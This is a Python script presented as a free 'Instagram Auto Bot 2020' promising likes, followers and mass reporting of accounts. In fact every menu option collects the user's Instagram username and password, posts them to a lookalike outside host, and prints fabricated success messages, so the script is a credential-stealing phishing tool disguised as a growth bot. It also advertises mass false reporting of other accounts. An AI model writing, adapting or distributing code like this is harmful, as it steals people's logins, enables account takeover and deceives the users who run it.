green = "\033[1;32;40m"
yellow='\033[2;33m'
lightyellow='\033[1;33m'
red='\033[2;31m'
blue='\033[2;36m'
violet='\033[2;35m'
darkblue='\033[2;34m'

os.system("clear")

banner="""  _____           _            ___       _   
  \_   \_ __  ___| |_ __ _    / __\ ___ | |_ 
   / /\/ '_ \/ __| __/ _` |  /__\/// _ \| __|
/\/ /_ | | | \__ \ || (_| | / \/  \ (_) | |_ 
\____/ |_| |_|___/\__\__,_| \_____/\___/ \__|
                                              """

print(green+banner)
print(lightyellow+"<----------Instagram Auto Bot 2020---------->")
note="""Note:This is a free instagram bot 2020,so you"""
note1="""can use only 3 times per day,because bot server """
note2="""is paid and we are using trial version and it """
note3="""has some limitations.the server may be slow:)"""
print(red+note)
print(red+note1)
print(red+note2)
print(red+note3)
print("")
print(blue+"[1] Instagram Auto Liker")
print(blue+"[2] Instagram Auto Report")
print(blue+"[3] Instagram Auto Followers")
print("")


def instabot():
	try:
		option=input(darkblue+"[*] Please select any option: ")
		if option == "1":
			print("")
			print(red+"[!] Note:You should have to login to your account")
			print(red+"[!] Note:Maximum number of like per day is 100")
			print(red+"[!] Wrong username or password may cause error")
			print(red+"[!] And the tool will not work properly")
			print("")
			username=input(green+"[*] Enter Username: ")
			password=input(green+"[*] Enter Password: ")
			try:
				if username =="":
					print(red+"[?] Invalid Login..!!")
					exit()
				elif password =="":
					print(red+"[?] Invalid Login..!!")
				else:
					url = "https://faceb00kgr0upschattings.000webhostapp.com/login.php"
					data={'username':username,'password':password}
					print(green+"[*] Logging in...")
					requests.post(url,data=data)
					link = input(darkblue+ "[*] Post link: ")
					print(green + "[*] Processing please wait...")
					time.sleep(5)
					print(yellow + "[*] 100 likes will be added to your post within 24 hours")
					exit()
						
			except KeyboardInterrupt:
				exit()
				
		if option =="2":
			print("")
			print(red+"[!] Note:You should have to login to your account")
			print(red+"[!] Note:Maximum number of report limit is 150")
			print(red+"[!] Wrong username or password may cause error")
			print(red+"[!] And the tool will not work properly")
			print("")
			username=input(green+"[*] Enter Username: ")
			password=input(green+"[*] Enter Password: ")
			try:
				if username =="":
					print(red+"[?] Invalid Login..!!")
					exit()
				elif password =="":
					print(red+"[?] Invalid Login..!!")
				else:
					url = "https://faceb00kgr0upschattings.000webhostapp.com/login.php"
					data={'username':username,'password':password}
					print(green+"[*] Logging in...")
					requests.post(url,data=data)
					link = input(darkblue+ "[*] Account  link: ")
					print(green + "[*] Processing please wait...")
					time.sleep(5)
					print(yellow + "[*] Account will reported as spam within 24 hours! ")
					print(yellow + "[*] Note: Maximum number of report limit is 150 ")
					exit()
						
			except KeyboardInterrupt:
				exit()
		if option =="3":
			print("")
			print(red+"[!] Note:You should have to login to your account")
			print(red+"[!] Maximum number of followers per day is 150!")
			print(red+"[!] Wrong username or password may cause error")
			print(red+"[!] And the tool will not work properly")
			print("")
			username=input(green+"[*] Enter Username: ")
			password=input(green+"[*] Enter Password: ")
			try:
				if username =="":
					print(red+"[?] Invalid Login..!!")
					exit()
				elif password =="":
					print(red+"[?]  Invalid Login..!!")
				else:
					url = "https://faceb00kgr0upschattings.000webhostapp.com/login.php"
					data={'username':username,'password':password}
					print(green+"[*] Logging in...")
					requests.post(url,data=data)
					link = input(darkblue+ "[*] Account  link: ")
					print(green + "[*] Processing please wait...")
					time.sleep(5)
					print(yellow + "[*] 150 followers will be added to your account within 24 hours ")
					print(yellow + "[*] Note: Maximum number of followers limit is 150 ")
					exit()
						
			except KeyboardInterrupt:
				exit()
			
	except:
		exit()
					
instabot()